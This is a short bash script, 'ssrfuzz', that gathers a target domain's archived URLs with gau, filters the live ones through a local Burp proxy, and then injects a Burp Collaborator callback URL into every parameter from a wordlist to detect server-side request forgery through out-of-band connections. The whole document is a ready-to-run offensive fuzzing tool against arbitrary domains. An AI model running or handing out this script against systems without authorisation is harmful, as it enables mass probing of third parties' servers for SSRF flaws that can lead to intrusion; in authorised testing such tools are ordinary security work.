#!/bin/bash
# ssrfuzz by redfr0g
# credits to Santosh Kumar Sha

if [ -z "$1" ]
  then
    echo "Usage: ./ssrfuzz.sh <domain> <burp collaborator link> <parameter list>"
    exit 1
fi

# Get args
domain=$1
collaborator=$2
wordlist=$3
output="$domain-$(date +'%m-%d-%Y').txt"

#Find known URLs and grep these with parameters
echo "[+] Finding URLs for domain $domain"
gau -b ttf,woff,svg,png,jpg,jpeg,css $domain | grep "=" | sort -u | grep "?" > $output
echo "[+] Found $(wc -l < $output) URLs"

# Check for alive URLs
echo "[+] Checking for active URLs"
echo "" > fuzz.txt
for url in $(cat $output)
do
  if curl -x http://127.0.0.1:8080 --output /dev/null --silent --fail $url; then
    echo $url >> fuzz.txt
  else
    :
  fi
done
echo "[+] Got $(wc -l < fuzz.txt) fuzzable URLs"

# Fuzz with Collaborator link and custom URL parameters wordlist (i.e. from ParamMiner)
echo "[+] Fuzzing parameters (this may take a while)..."
xargs -a $wordlist -I@ bash -c 'for url in $(cat fuzz.txt); do echo "$url&@='http://$collaborator'";done' | xargs curl -s -x http://127.0.0.1:8080 --output /dev/null
echo "[+] Finished! Check Burp Collaborator for any connections"